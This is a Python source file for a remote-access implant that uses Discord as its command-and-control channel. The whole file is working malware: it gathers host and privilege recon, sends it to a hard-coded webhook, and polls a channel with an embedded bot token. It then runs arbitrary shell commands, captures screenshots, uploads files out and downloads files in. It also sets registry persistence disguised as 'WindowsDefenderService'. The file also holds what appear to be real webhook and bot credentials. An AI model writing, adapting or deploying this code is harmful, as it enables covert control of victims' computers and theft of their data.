"""
discord_implant.py — Discord C2 Implant (stdlib only)
22DIV / george wu
Classification: UNCLASSIFIED // ACADEMIC USE ONLY

Lightweight implant that uses Discord as C2 channel.
Zero external dependencies — stdlib only (urllib, json, subprocess).
Runs on any machine with Python 3.6+.

The implant:
  1. Generates session ID
  2. Runs basic recon
  3. POSTs recon to Discord webhook
  4. Polls channel for commands (using bot token)
  5. Executes commands, posts output back
  6. Loop until EXIT or connection lost

Config is baked in at the top — set before deployment.

Usage:
    python discord_implant.py
    pythonw discord_implant.py    (windowless)
"""

import os
import sys
import json
import time
import socket
import hashlib
import platform
import subprocess
import urllib.request
import urllib.error
import http.client
import ssl

# ══════════════════════════════════════════════════════════════
# CONFIG — SET THESE BEFORE DEPLOYING
# ══════════════════════════════════════════════════════════════

WEBHOOK_URL = "https://discord.com/api/webhooks/1518584521782722702/P-SIGTBJmyVLoywB0QiDu-9XLeHuKp9bcXBnXPVwtoIo3ttxXO51BslE1WEN5SonjMEr"
BOT_TOKEN = "MTQ5ODM0OTY5NzA1OTAwMDQ0MQ.GSaR8N.EuszYbcNKsx6Sc3gVHFuvQTEenO--AvCO91krg"
CHANNEL_ID = "1518584455411925193"
POLL_INTERVAL = 5      # seconds between command polls
HEARTBEAT_INTERVAL = 600   # 10 min — reduce channel spam

# ══════════════════════════════════════════════════════════════
# SESSION
# ══════════════════════════════════════════════════════════════

def gen_session_id():
    raw = f"{socket.gethostname()}-{os.getlogin()}-{time.time()}"
    return hashlib.md5(raw.encode()).hexdigest()[:8]

SESSION_ID = gen_session_id()

# ══════════════════════════════════════════════════════════════
# DISCORD API (stdlib only)
# ══════════════════════════════════════════════════════════════

def post_webhook(content):
    if not WEBHOOK_URL:
        return
    data = json.dumps({"content": content[:1990]}).encode("utf-8")
    req = urllib.request.Request(WEBHOOK_URL, data=data, headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    })
    try:
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def post_json(payload):
    post_webhook(json.dumps(payload))

def get_messages(limit=10):
    if not BOT_TOKEN or not CHANNEL_ID:
        return []
    try:
        ctx = ssl.create_default_context()
        conn = http.client.HTTPSConnection("discord.com", 443, timeout=10, context=ctx)
        conn.request("GET", f"/api/v10/channels/{CHANNEL_ID}/messages?limit={limit}", headers={
            "Authorization": f"Bot {BOT_TOKEN}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept": "application/json",
        })
        resp = conn.getresponse()
        if resp.status != 200:
            return []
        data = json.loads(resp.read().decode("utf-8"))
        conn.close()
        return data
    except Exception:
        return []

# ══════════════════════════════════════════════════════════════
# RECON (lightweight, no powershell)
# ══════════════════════════════════════════════════════════════

def run_cmd(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                          text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"

def recon():
    info = []
    info.append(f"hostname: {socket.gethostname()}")
    info.append(f"user: {os.getlogin()}")
    info.append(f"os: {platform.platform()}")
    info.append(f"arch: {platform.machine()}")
    info.append(f"python: {sys.version.split()[0]}")
    info.append(f"pid: {os.getpid()}")
    info.append(f"cwd: {os.getcwd()}")

    info.append(f"\n--- whoami /priv ---\n{run_cmd('whoami /priv')}")
    info.append(f"\n--- ipconfig ---\n{run_cmd('ipconfig')}")
    info.append(f"\n--- net user ---\n{run_cmd('net user')}")
    info.append(f"\n--- tasklist (AV) ---\n{run_cmd('tasklist /FI \"IMAGENAME eq MsMpEng.exe\"')}")
    info.append(f"\n--- installed software ---\n{run_cmd('wmic product get name 2>nul | head -20', timeout=20)}")

    return "\n".join(info)

# ══════════════════════════════════════════════════════════════
# SPECIAL COMMANDS
# ══════════════════════════════════════════════════════════════

def take_screenshot():
    try:
        import ctypes
        import struct
        import tempfile

        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)

        hdc_screen = user32.GetDC(0)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, w, h)
        gdi32.SelectObject(hdc_mem, hbmp)
        gdi32.BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, 0, 0, 0x00CC0020)

        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [
                ("biSize", ctypes.c_uint32), ("biWidth", ctypes.c_int32),
                ("biHeight", ctypes.c_int32), ("biPlanes", ctypes.c_uint16),
                ("biBitCount", ctypes.c_uint16), ("biCompression", ctypes.c_uint32),
                ("biSizeImage", ctypes.c_uint32), ("biXPelsPerMeter", ctypes.c_int32),
                ("biYPelsPerMeter", ctypes.c_int32), ("biClrUsed", ctypes.c_uint32),
                ("biClrImportant", ctypes.c_uint32),
            ]

        bmi = BITMAPINFOHEADER()
        bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.biWidth = w
        bmi.biHeight = -h
        bmi.biPlanes = 1
        bmi.biBitCount = 24
        stride = ((w * 3 + 3) & ~3)
        bmi.biSizeImage = stride * h
        buf = ctypes.create_string_buffer(bmi.biSizeImage)
        gdi32.GetDIBits(hdc_mem, hbmp, 0, h, buf, ctypes.byref(bmi), 0)

        bmp_header = struct.pack('<2sIHHI', b'BM',
            14 + ctypes.sizeof(BITMAPINFOHEADER) + bmi.biSizeImage,
            0, 0, 14 + ctypes.sizeof(BITMAPINFOHEADER))
        raw_bmp = bmp_header + bytes(bmi) + buf.raw

        gdi32.DeleteObject(hbmp)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(0, hdc_screen)

        tmp = os.path.join(tempfile.gettempdir(), "sc.bmp")
        with open(tmp, "wb") as f:
            f.write(raw_bmp)
        result = upload_file(tmp)
        try:
            os.remove(tmp)
        except OSError:
            pass
        return f"[SCREENSHOT] {w}x{h} ({len(raw_bmp)} bytes) — {result}"
    except Exception as e:
        return f"[SCREENSHOT ERROR] {e}"

def install_persistence():
    try:
        import winreg
        exe_path = os.path.abspath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsDefenderService", 0, winreg.REG_SZ,
            f'pythonw "{exe_path}"')
        winreg.CloseKey(key)
        return f"[PERSIST] Added to HKCU Run: {exe_path}"
    except Exception as e:
        return f"[PERSIST ERROR] {e}"

def download_file(url, path):
    try:
        urllib.request.urlretrieve(url, path)
        size = os.path.getsize(path)
        return f"[DOWNLOAD] {url} -> {path} ({size} bytes)"
    except Exception as e:
        return f"[DOWNLOAD ERROR] {e}"

def upload_file(path):
    try:
        if not os.path.isfile(path):
            return f"[UPLOAD ERROR] File not found: {path}"
        size = os.path.getsize(path)
        if size > 8 * 1024 * 1024:
            return f"[UPLOAD ERROR] File too large ({size} bytes, max 8MB)"

        with open(path, "rb") as f:
            file_data = f.read()

        boundary = "----CheyanneBoundary"
        filename = os.path.basename(path)

        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"content\"\r\n\r\n"
            f"[UPLOAD] {SESSION_ID}: {filename} ({size} bytes)\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode("utf-8") + file_data + f"\r\n--{boundary}--\r\n".encode("utf-8")

        req = urllib.request.Request(WEBHOOK_URL, data=body, headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "Mozilla/5.0"
        })
        urllib.request.urlopen(req, timeout=30)
        return f"[UPLOAD] Sent {filename} ({size} bytes)"
    except Exception as e:
        return f"[UPLOAD ERROR] {e}"

# ══════════════════════════════════════════════════════════════
# COMMAND HANDLER
# ══════════════════════════════════════════════════════════════

def handle_command(cmd_str):
    cmd_str = cmd_str.strip()
    upper = cmd_str.upper()

    if upper == "EXIT" or upper == "QUIT":
        post_json({"type": "output", "session": SESSION_ID,
                   "hostname": socket.gethostname(),
                   "data": "[IMPLANT] Exiting."})
        sys.exit(0)

    if upper == "SCREENSHOT":
        return take_screenshot()

    if upper == "PERSIST":
        return install_persistence()

    if upper.startswith("DOWNLOAD "):
        parts = cmd_str.split(maxsplit=2)
        if len(parts) == 3:
            return download_file(parts[1], parts[2])
        return "[DOWNLOAD] Usage: DOWNLOAD <url> <local_path>"

    if upper.startswith("UPLOAD "):
        path = cmd_str[7:].strip()
        return upload_file(path)

    if upper == "RECON":
        return recon()

    return run_cmd(cmd_str, timeout=30)

# ══════════════════════════════════════════════════════════════
# MAIN LOOP
# ══════════════════════════════════════════════════════════════

def main():
    if not WEBHOOK_URL:
        print("[!] WEBHOOK_URL not set — edit the config at the top of this file")
        sys.exit(1)

    # phase 1: recon + check in
    hostname = socket.gethostname()
    recon_data = recon()

    post_json({
        "type": "recon",
        "session": SESSION_ID,
        "hostname": hostname,
        "data": recon_data
    })

    # phase 2: command loop
    last_seen_id = None
    last_heartbeat = time.time()

    while True:
        try:
            # heartbeat
            if time.time() - last_heartbeat > HEARTBEAT_INTERVAL:
                post_json({
                    "type": "heartbeat",
                    "session": SESSION_ID,
                    "hostname": hostname
                })
                last_heartbeat = time.time()

            # poll for commands
            messages = get_messages(limit=5)
            for msg in reversed(messages):
                msg_id = msg.get("id", "")
                content = msg.get("content", "").strip()

                if last_seen_id and int(msg_id) <= int(last_seen_id):
                    continue

                # parse JSON command messages
                try:
                    data = json.loads(content)
                    if (data.get("type") == "cmd" and
                        data.get("session") == SESSION_ID):
                        command = data.get("command", "")
                        if command:
                            output = handle_command(command)
                            post_json({
                                "type": "output",
                                "session": SESSION_ID,
                                "hostname": hostname,
                                "data": output
                            })
                except (json.JSONDecodeError, KeyError):
                    pass

                last_seen_id = msg_id

            time.sleep(POLL_INTERVAL)

        except KeyboardInterrupt:
            post_json({"type": "output", "session": SESSION_ID,
                       "hostname": hostname, "data": "[IMPLANT] Operator killed."})
            break
        except Exception:
            time.sleep(POLL_INTERVAL * 2)
            continue


if __name__ == "__main__":
    main()
